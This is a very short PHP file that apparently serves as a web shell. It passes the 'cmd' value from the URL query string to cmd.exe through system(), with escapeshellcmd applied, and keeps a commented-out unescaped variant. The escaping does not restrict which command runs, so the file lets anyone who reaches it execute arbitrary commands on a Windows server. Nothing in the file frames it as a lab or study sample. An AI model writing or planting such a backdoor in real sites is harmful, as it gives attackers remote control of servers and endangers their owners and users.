<?php
 //system('cmd.exe /C '.$_GET['cmd']);
 system('cmd.exe /C '.escapeshellcmd($_GET['cmd']));
?>